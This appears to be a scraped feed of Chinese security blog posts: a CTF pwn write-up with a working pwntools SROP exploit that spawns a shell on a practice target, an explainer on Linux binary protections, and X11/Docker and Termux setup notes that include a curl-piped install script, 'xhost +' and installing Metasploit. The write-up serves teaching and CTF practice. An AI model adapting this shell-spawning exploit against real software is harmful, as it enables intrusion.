1234567$ checksec ./ciscn_s_3[*] '/root/tmp/ciscn_2019_s_3/ciscn_s_3' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Analysis程序在 main 中调用了 vuln： 1234567891011000000000040051d &lt;main&gt;: 40051d: 55 push rbp 40051e: 48 89 e5 mov rbp,rsp 400521: 48 83 ec 10 sub rsp,0x10 400525: 89 7d fc mov DWORD PTR [rbp-0x4],edi 400528: 48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 40052c: b8 00 00 00 00 mov eax,0x0 400531: e8 b7 ff ff ff call 4004ed &lt;vuln&gt; 400536: 90 nop 400537: c9 leave 400538: c3 ret vuln 中读了 0x400 到 [rsp-0x10] 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP： 123456789101112131415161700000000004004ed &lt;vuln&gt;: 4004ed: 55 push rbp 4004ee: 48 89 e5 mov rbp,rsp 4004f1: 48 31 c0 xor rax,rax 4004f4: ba 00 04 00 00 mov edx,0x400 4004f9: 48 8d 74 24 f0 lea rsi,[rsp-0x10] 4004fe: 48 89 c7 mov rdi,rax 400501: 0f 05 syscall 400503: 48 c7 c0 01 00 00 00 mov rax,0x1 40050a: ba 30 00 00 00 mov edx,0x30 40050f: 48 8d 74 24 f0 lea rsi,[rsp-0x10] 400514: 48 89 c7 mov rdi,rax 400517: 0f 05 syscall 400519: c3 ret 40051a: 90 nop 40051b: 5d pop rbp 40051c: c3 ret 另外还提供了 sys_execve 和 sys_sigreturn 的调用号： 1234567891000000000004004d6 &lt;gadgets&gt;: 4004d6: 55 push rbp 4004d7: 48 89 e5 mov rbp,rsp 4004da: 48 c7 c0 0f 00 00 00 mov rax,0xf 4004e1: c3 ret 4004e2: 48 c7 c0 3b 00 00 00 mov rax,0x3b 4004e9: c3 ret 4004ea: 90 nop 4004eb: 5d pop rbp 4004ec: c3 ret 这题相对简单一些，可以写 &quot;/bin/sh&quot; 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。 Exploit脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/env pythonfrom pwn import *context.arch = 'amd64'context.log_level = 'debug'#context.terminal = ['lxterminal', '-e']local = 0if local: p = process('./ciscn_s_3')else: p = remote('node3.buuoj.cn', 28526)#gdb.attach(p)vuln_addr = 0x4004f1set_sigreturn_addr = 0x4004daset_execve_addr = 0x4004e2syscall_ret = 0x400517payload = '/bin/sh\\x00'.ljust(16, 'A') + p64(vuln_addr)raw_input('@')p.send(payload)p.recv(32)stack_addr = u64(p.recv(8))info('stack_addr = ' + hex(stack_addr))bin_sh_addr = stack_addr - 0x118payload = p64(set_sigreturn_addr) + p64(syscall_ret)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload += str(frame)raw_input('@')p.send(payload)p.interactive() PreventionGadgets Prevention在当前的几种不同的操作系统中，sigreturn 和 syscall; ret 这两个 Gadgets 非常容易被找到，特别是在 vsyscall 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。 Signal Frame Canaries这种方法借鉴于 Stack Canaries 机制，即在Signal Frame的rt_sigreturn字段之前插入一段随机生成的字节，如果发生 Overflow，则该段字节会被破坏，从而在发生sigreturn之前会被检测到。同时针对 Stack Canaries 的攻击也很多，其同样不能从本质上防止 SROP 的发生。 Break kernel agnostic这就要追溯到 SROP 的本质问题了，就是内核对 Signal 的不可知性。如果我们在内核处理 sigreturn 系统调用的时候判断一下当前的 Signal Frame 是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。 Referenceshttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srophttps://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/sigcontext.hhttps://bestwing.me/stack-overflow-three-SROP.htmlhttp://blog.leanote.com/post/3191220142@qq.com/SROPhttps://www.freebuf.com/articles/network/87447.htmlhttp://blog.eonew.cn/archives/975https://bestwing.me/2017-360chunqiu-online.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"Linux下的各类程序保护机制","slug":"Linux下的各类程序保护机制","date":"2020-03-06T10:59:35.000Z","updated":"2020-03-13T15:52:25.580Z","comments":true,"path":"2020/03/06/Linux下的各类程序保护机制/","link":"","permalink":"blog.b3ale.cn/2020/03/06/Linux下的各类程序保护机制/","excerpt":"之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。","text":"之前一直在做逆向，快一年没碰 PWN 了，接下来有一堆比赛，赶紧重新 PWN 起来。这里先整理一下 Linux 下的程序保护机制。 EnvironmentLinux 版本： 12$ uname -aLinux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux GCC 版本： 12345$ gcc --versiongcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609Copyright (C) 2015 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. ChecksecChecksec 是用 Shell 编写的一个脚本，它可以用来检查可执行文件属性，例如 PIE, RELRO, PaX, Canaries, ASLR, Fortify Source 等等属性。 CannaryCanary 表示栈保护功能是否开启。栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 Shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 Cookie 信息，当函数真正返回的时候会验证 Cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 Cookie 信息给覆盖掉，导致栈保护检查失败而阻止 Shellcode 的执行。在 Linux 中将 Cookie 信息称为 Canary。 gcc 在 4.2 版本中添加了 -fstack-protector 和 -fstack-protector-all 编译参数以支持栈保护功能，4.9 新增了 -fstack-protector-strong 编译参数让保护的范围更广。故在编译时可以控制是否开启栈保护以及程度。 测试代码： 1234567#include &lt;stdio.h&gt;int main() &#123; char buf[20]; gets(buf); return 0;&#125; Default（-fstack-protector）默认情况下，开启了 Cannary 保护（即 -fstack-protector 参数），一开始会在栈上存储 Cannary（QWORD PTR fs:0x28），在程序结束时通过异或检查栈上的值是否正确来检查 Cannary 是否被篡改，如果不正确则调用 __stack_chk_fail() 产生报错： 12345678910111213141516171819200000000000400596 &lt;main&gt;: 400596: 55 push rbp 400597: 48 89 e5 mov rbp,rsp 40059a: 48 83 ec 20 sub rsp,0x20 40059e: 64 48 8b 04 25 28 00 mov rax,QWORD PTR fs:0x28 4005a5: 00 00 4005a7: 48 89 45 f8 mov QWORD PTR [rbp-0x8],rax 4005ab: 31 c0 xor eax,eax 4005ad: 48 8d 45 e0 lea rax,[rbp-0x20] 4005b1: 48 89 c7 mov rdi,rax 4005b4: b8 00 00 00 00 mov eax,0x0 4005b9: e8 c2 fe ff ff call 400480 &lt;gets@plt&gt; 4005be: b8 00 00 00 00 mov eax,0x0 4005c3: 48 8b 55 f8 mov rdx,QWORD PTR [rbp-0x8] 4005c7: 64 48 33 14 25 28 00 xor rdx,QWORD PTR fs:0x28 4005ce: 00 00 4005d0: 74 05 je 4005d7 &lt;main+0x41&gt; 4005d2: e8 89 fe ff ff call 400460 &lt;__stack_chk_fail@plt&gt; 4005d7: c9 leave 4005d8: c3 ret -fno-stack-protector-fstack-protector 参数取消对栈的保护，直接编译成程序所对应的汇编： 12345678910110000000000400526 &lt;main&gt;: 400526: 55 push rbp 400527: 48 89 e5 mov rbp,rsp 40052a: 48 83 ec 20 sub rsp,0x20 40052e: 48 8d 45 e0 lea rax,[rbp-0x20] 400532: 48 89 c7 mov rdi,rax 400535: b8 00 00 00 00 mov eax,0x0 40053a: e8 d1 fe ff ff call 400410 &lt;gets@plt&gt; 40053f: b8 00 00 00 00 mov eax,0x0 400544: c9 leave 400545: c3 ret NX（DEP）NX 即 No-eXecute（不可执行）的意思，NX（即 Windows 下的 DEP，数据执行保护）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 Shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。 Default（-z noexecstack）默认开始 NX，栈上的数据不可执行： 12345678910111213141516171819assassinq$ vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/beale/Test_Dir/main0x00600000 0x00601000 r--p /home/beale/Test_Dir/main0x00601000 0x00602000 rw-p /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] -z execstack开启栈可执行后，栈上的代码可被执行，同时其他处内存部分都是读写执行全开： 12345678910111213141516171819assassinq$ vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/beale/Test_Dir/main0x00600000 0x00601000 r-xp /home/beale/Test_Dir/main0x00601000 0x00602000 rwxp /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rwxp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rwxp mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rwxp mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rwxp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rwxp mapped0x00007ffffffde000 0x00007ffffffff000 rwxp [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] PIE（ASLR）一般情况下 NX 和地址空间分布随机化（ASLR）会同时工作。ASLR 不负责代码段以及数据段的随机化工作，这项工作由 PIE 负责；但是只有在开启 ASLR 之后，PIE 才会生效。内存地址随机化机制（Address Space Layout Randomization)，有以下三种情况（具体的 ASLR 和 PIE 的互相作用：https://www.cnblogs.com/rec0rd/p/7646857.html）： 0 - 表示关闭进程地址空间随机化。 1 - 表示将 mmap 的基址，stack 和 Vdso 页面随机化。 2 - 表示在 1 的基础上增加 heap 的随机化。 可以防范基于 ret2libc 方式的针对 DEP 的攻击。ASLR 和 DEP 配合使用，能有效阻止攻击者在堆栈上运行恶意代码。位置独立的可执行区域（Position-Independent Executables）使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（Return-Oriented Programming）方法变得难得多。 Linux 关闭 PIE 的方法： 12&gt; echo 0 | sudo tee /proc/sys/kernel/randomize_va_space&gt; Default（-no-pie）默认不开启。静态分析程序时所得到的地址都是运行时的真实地址，基地址为 0x400000： 123456780000000000400526 &lt;main&gt;: 400526: 55 push rbp 400527: 48 89 e5 mov rbp,rsp 40052a: bf c4 05 40 00 mov edi,0x4005c4 40052f: e8 cc fe ff ff call 400400 &lt;puts@plt&gt; 400534: b8 00 00 00 00 mov eax,0x0 400539: 5d pop rbp 40053a: c3 ret 与 gdb 调试的时候相同： 123456789───────────────────────────────────── Code ───────────────────────────────────── 0x400521 &lt;frame_dummy+33&gt;: jmp 0x4004a0 &lt;register_tm_clones&gt; 0x400526 &lt;main&gt;: push rbp 0x400527 &lt;main+1&gt;: mov rbp,rsp=&gt; 0x40052a &lt;main+4&gt;: mov edi,0x4005c4 0x40052f &lt;main+9&gt;: call 0x400400 &lt;puts@plt&gt; 0x400534 &lt;main+14&gt;: mov eax,0x0 0x400539 &lt;main+19&gt;: pop rbp 0x40053a &lt;main+20&gt;: ret -pie-fpie 与 -fPIE 效果一样，用于编译；-pie 用于链接。开启 PIE 后的静态反编译结果没有基地址，每次运行时的基地址不同： 123456780000000000000750 &lt;main&gt;: 750: 55 push rbp 751: 48 89 e5 mov rbp,rsp 754: 48 8d 3d 99 00 00 00 lea rdi,[rip+0x99] # 7f4 &lt;_IO_stdin_used+0x4&gt; 75b: e8 90 fe ff ff call 5f0 &lt;puts@plt&gt; 760: b8 00 00 00 00 mov eax,0x0 765: 5d pop rbp 766: c3 ret gdb 调试时如下： 1234567891011───────────────────────────────────── Code ───────────────────────────────────── 0x55555555474b &lt;frame_dummy+43&gt;: jmp 0x555555554690 &lt;register_tm_clones&gt; 0x555555554750 &lt;main&gt;: push rbp 0x555555554751 &lt;main+1&gt;: mov rbp,rsp=&gt; 0x555555554754 &lt;main+4&gt;: lea rdi,[rip+0x99] # 0x5555555547f4 0x55555555475b &lt;main+11&gt;: call 0x5555555545f0 &lt;puts@plt&gt; 0x555555554760 &lt;main+16&gt;: mov eax,0x0 0x555555554765 &lt;main+21&gt;: pop rbp 0x555555554766 &lt;main+22&gt;: ret[rip+0x99] : 0x5555555547f4 (&quot;Hello World&quot;) RELRO在 Linux 系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC、GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro（Read Only Relocation）的技术。大概实现就是由 linker 指定程序的一块经过 dynamic linker 处理过 relocation 之后的区域为只读. 设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT 攻击。RELRO 为 Partial RELRO，说明对 GOT 表具有写权限。 Default（-z lazy）默认情况下对 GOT 表具有写权限。可以看到 puts 和 _libc_start_main 所在的内存部分是可写的： 1234567891011121314151617181920212223242526272829303132333435assassinq$ checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : Partialassassinq$ got/home/beale/Test_Dir/main: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE0000000000600ff8 R_X86_64_GLOB_DAT __gmon_start__0000000000601018 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.50000000000601020 R_X86_64_JUMP_SLOT __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/beale/Test_Dir/main0x00600000 0x00601000 r--p /home/beale/Test_Dir/main0x00601000 0x00602000 rw-p /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] -z norelro没有开启 RELRO 的情况： 12345678910111213141516171819202122232425262728293031323334assassinq$ checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : disabledassassinq$ got/home/beale/Test_Dir/main: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE00000000006008a8 R_X86_64_GLOB_DAT __gmon_start__00000000006008c8 R_X86_64_JUMP_SLOT puts@GLIBC_2.2.500000000006008d0 R_X86_64_JUMP_SLOT __libc_start_main@GLIBC_2.2.5assassinq$ vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/beale/Test_Dir/main0x00600000 0x00601000 rw-p /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] -z now此时无法修改 GOT 表。puts 和 _libc_start_main 所在的内存部分只有读权限： 1234567891011121314151617181920212223242526272829303132333435assassinq$ checksecCANARY : disabledFORTIFY : disabledNX : ENABLEDPIE : disabledRELRO : FULLassassinq$ got/home/beale/Test_Dir/main: file format elf64-x86-64DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE0000000000600fe8 R_X86_64_GLOB_DAT puts@GLIBC_2.2.50000000000600ff0 R_X86_64_GLOB_DAT __libc_start_main@GLIBC_2.2.50000000000600ff8 R_X86_64_GLOB_DAT __gmon_start__assassinq$ vmmapStart End Perm Name0x00400000 0x00401000 r-xp /home/beale/Test_Dir/main0x00600000 0x00601000 r--p /home/beale/Test_Dir/main0x00601000 0x00602000 rw-p /home/beale/Test_Dir/main0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fdd000 0x00007ffff7fe0000 rw-p mapped0x00007ffff7ff8000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] Conclusion各种安全选择的编译参数如下： NX：-z execstack / -z noexecstack (关闭 / 开启) Canary：-fno-stack-protector / -fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启) PIE：-no-pie / -pie (关闭 / 开启) RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启) Referenceshttp://www.gandalf.site/2019/03/linux-pwn.htmlhttps://stackoverflow.com/questions/24465014/gcc-generate-canary-or-nothttps://stackoverflow.com/questions/2463150/what-is-the-fpie-option-for-position-independent-executables-in-gcc-and-ldhttps://richardustc.github.io/2013-05-21-2013-05-21-pie.htmlhttp://liudonghua.com/archives/2014/10/26/gcc_g++%E4%B8%AD%E7%9A%84pic%E4%B8%8Epie/https://paper.seebug.org/481/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"blog.b3ale.cn/tags/pwn/"}]},{"title":"使用X11在macOS上获得更好的体验","slug":"使用X11在macOS上获得更好的体验","date":"2020-03-05T01:05:31.000Z","updated":"2020-03-07T03:25:09.695Z","comments":true,"path":"2020/03/05/使用X11在macOS上获得更好的体验/","link":"","permalink":"blog.b3ale.cn/2020/03/05/使用X11在macOS上获得更好的体验/","excerpt":"X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。","text":"X11 也叫做 X Window 系统，X Window 系统（X11 或 X）是一种位图显示的视窗系统。它是在 Unix 和 类 Unix 操作系统，以及 OpenVMS 上建立图形用户界面的标准工具包和协议，并可用于几乎所有已有的现代操作系统。 Environment使用 Homebrew 下载 XQuartz： 1brew cask install xquartz 打开 XQuartz 并设置如下： 1open -a XQuartz SSHssh 命令中加上 -X 参数，可以打开远程的 GUI 界面： 1234567891011121314151617181920$ ssh -X beale@192.168.2.190beale@192.168.2.190's password:Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage700 packages can be updated.452 updates are security updates.The programs included with the Ubuntu system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted byapplicable law.$ firefox DockerDocker 现在已经是一个配置环境的利器，缺点就是只有 CLI，但可以通过 X11 在 Docker 中开启 GUI。首先需要获取本机 IP 地址，并添加到 X11 Server 的列表中： 123$ IP=$(ifconfig en0 | grep inet | awk '$1==\"inet\" &#123;print $2&#125;')$ echo $IP$ xhost + $IP 通过参数 -e 覆盖容器内的环境变量 DISPLAY=$IP:0，并用 -v 参数挂载本地 /tmp/.X11-unix 到容器内部的同一位置，利用 Docker Hub 中提供的一个 Firefox 的镜像来启动装有 Firefox 浏览器的容器： 1docker run -d --name firefox -e DISPLAY=$IP:0 -v /tmp/.X11-unix:/tmp/.X11-unix jess/firefox Upgrade在 Docker 中使用 GDB 调试一般采用 tmux 来解决窗口的问题，很久之前看了 Swings 大佬的博客，发现了用 X11 来实现 GDB 弹窗的方法，这种感觉想想就爽。这里 XQuartz 主要作为一个新终端的承载器和 host 机器和 Docker 的通讯器。 和上面同理也是先获取 IP，再做一个环境变量的覆盖和 X11 文件的挂载，这里用我的镜像启动： 1docker run -it --rm --privileged -e DISPLAY=$IP:0 -v &quot;/tmp/.X11-unix:/tmp/.X11-unix&quot; -v &quot;$PWD:/root/tmp&quot; assassinq/pwn-machine-16.04:v8 /bin/bash 然后终端需要设置一下字体的编码，测试的时候发现不改变编码弹窗的时候会发生乱码的情况： 1export LANG=C.UTF-8 同时，弹窗的终端使用的是 lxterminal，一个比较轻量级的终端。exp 里终端设置如下： 1context.terminal = [\"lxterminal\", \"-e\"] 接下来就可以开始愉快地调试了： Referenceshttps://blog.csdn.net/hdzhang_blog/article/details/80058559https://bestwing.me/Docker-for-Mac-and-run-gdb-GUI-window.htmlhttp://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.htmlhttps://sourabhbajaj.com/blog/2017/02/07/gui-applications-docker-mac/","categories":[],"tags":[{"name":"macos","slug":"macos","permalink":"blog.b3ale.cn/tags/macos/"}]},{"title":"使用Termux在Android上打造小型Linux服务器","slug":"使用Termux在Android上打造小型Linux服务器","date":"2020-03-01T02:50:30.000Z","updated":"2020-03-04T01:46:16.813Z","comments":true,"path":"2020/03/01/使用Termux在Android上打造小型Linux服务器/","link":"","permalink":"blog.b3ale.cn/2020/03/01/使用Termux在Android上打造小型Linux服务器/","excerpt":"使用 Termux 可以在 Android 上获得极佳的终端体验。","text":"使用 Termux 可以在 Android 上获得极佳的终端体验。 一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。 oh-my-zsh在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本： 1sh -c \"$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)\" 具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输： 12345678$ ls -l storagetotal 24lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar 1 12:45 dcim -&gt; /storage/emulated/0/DCIMlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar 1 12:45 downloads -&gt; /storage/emulated/0/Downloadlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar 1 12:45 movies -&gt; /storage/emulated/0/Movieslrwxrwxrwx 1 u0_a146 u0_a146 30 Mar 1 12:45 music -&gt; /storage/emulated/0/Musiclrwxrwxrwx 1 u0_a146 u0_a146 30 Mar 1 12:45 pictures -&gt; /storage/emulated/0/Pictureslrwxrwxrwx 1 u0_a146 u0_a146 22 Mar 1 12:45 shared -&gt; /storage/emulated/0 同样，我们可以给 QQ 的文件传输整一个软链接： 1ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ 如此一来，传输文件就方便了很多： 1234$ ls -al...lrwxrwxrwx 1 u0_a146 u0_a146 70 Mar 1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv... 还能修改启动时的问候语： 12cp $PREFIX/etc/motd $PREFIX/etc/motd.bakvim $PREFIX/etc/motd Change apt-sources给 apt 换个清华源： 12export EDITOR=viapt edit-sources 修改为以下内容： 12# The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main SSH接下来装个 SSH，用电脑连上更方便地进行后续的安装。 123apt updateapt upgradeapt install openssh 将电脑的公钥 push 到手机上： 1adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys 在 Termux 中把电脑公钥放在 .ssh 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务： 1234cd .sshmv /sdcard/authorized_keys .chmod 400 authorized_keyssshd 在电脑上转发 adb 端口并连接： 12adb forward tcp:8022 tcp:8022ssh localhost -p 8022 PythonPython 必不可少。默认 Python 指 Python3，Python2 指 Python2： 12apt install python2apt install python # python3 IPythonIPython 的安装必须有 clang 的依赖，否则会报错： 123apt install clangpip install ipythonpip3.6 install ipython tsu用 tsu 替代 su 可以完美实现 root 转换： 1apt install tsu MSF需要联（ke）网（xue）下载： 12apt install unstable-repoapt install metasploit 输入 msfconsole 可以查看效果： 这个版本也已经有 CVE-2019-0708 的 EXP 了： Termux-API其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 Termux:API 这一 APP，然后用 apt 安装命令行： 1apt install termux-api 获取电池信息： 123456789$ termux-battery-status&#123; \"health\": \"GOOD\", \"percentage\": 100, \"plugged\": \"PLUGGED_USB\", \"status\": \"FULL\", \"temperature\": 22.700000762939453, \"current\": -38757&#125; 获取相机信息： 1$ termux-camera-info 获取与设置剪切板： 123$ termux-clipboard-set thisisassassinq$ termux-clipboard-getthisisassassinq 获取通讯录列表： 1$ termux-contact-list 拨打电话： 1$ termux-telephony-call 10001 获取当前 Wi-Fi 连接信息： 12345678910111213$ termux-wifi-connectioninfo&#123; \"bssid\": \"02:00:00:00:00:00\", \"frequency_mhz\": 2412, \"ip\": \"192.168.101.68\", \"link_speed_mbps\": 144, \"mac_address\": 